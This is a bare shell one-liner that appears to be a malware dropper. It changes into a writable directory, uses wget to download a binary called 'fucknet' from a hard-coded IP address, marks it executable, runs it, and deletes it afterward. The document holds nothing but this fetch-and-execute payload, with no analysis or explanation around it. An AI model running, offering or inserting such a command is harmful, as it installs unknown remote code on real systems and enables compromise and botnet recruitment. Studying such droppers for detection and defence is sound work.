cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.198.60/fucknet; chmod +x fucknet; ./fucknet; rm -rf fucknet
